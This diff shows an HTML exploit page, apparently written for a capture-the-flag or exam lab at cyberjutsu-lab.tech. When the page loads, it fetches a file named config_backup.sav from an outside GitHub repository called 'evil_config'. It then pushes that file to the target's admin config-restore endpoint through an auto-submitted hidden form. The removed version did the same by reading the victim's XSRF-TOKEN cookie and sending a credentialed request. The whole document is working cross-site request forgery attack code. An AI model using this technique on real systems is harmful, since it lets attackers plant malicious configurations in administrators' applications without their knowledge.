@@ -2,44 +2,26 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Exploit</title>
+  <title>Exploit .sav</title>
 </head>
 <body>
+  <form id="upload" method="POST" action="https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore" enctype="multipart/form-data"></form>
+
   <script>
-    // Bước 1: Lấy token từ cookie
-    function getXSRFToken() {
-      const cookies = document.cookie.split(";");
-      for (let cookie of cookies) {
-        const [name, value] = cookie.trim().split("=");
-        if (name === "XSRF-TOKEN") {
-          return decodeURIComponent(value);
-        }
-      }
-      return null;
-    }
-
-    // Bước 2: Fetch file và gửi
     fetch("https://raw.githubusercontent.com/Shu-Ouma-0/evil_config/refs/heads/main/config_backup.sav")
-      .then(res => res.blob())
+      .then(r => r.blob())
       .then(blob => {
-        const xsrfToken = getXSRFToken();
-        const formData = new FormData();
-        formData.append("config_file", blob, "config_backup.sav");
+        const file = new File([blob], "config_backup.sav");
+        const dt = new DataTransfer();
+        dt.items.add(file);
 
-        return fetch("https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore", {
-          method: "POST",
-          headers: {
-            "X-XSRF-TOKEN": xsrfToken
-          },
-          body: formData,
-          credentials: "include"  // gửi kèm cookie
-        });
-      })
-      .then(res => {
-        console.log("Upload done:", res.status);
-      })
-      .catch(err => {
-        console.error("Exploit failed:", err);
+        const input = document.createElement("input");
+        input.type = "file";
+        input.name = "config_file";
+        input.files = dt.files;
+
+        document.getElementById("upload").appendChild(input);
+        document.getElementById("upload").submit();
       });
   </script>
 </body>
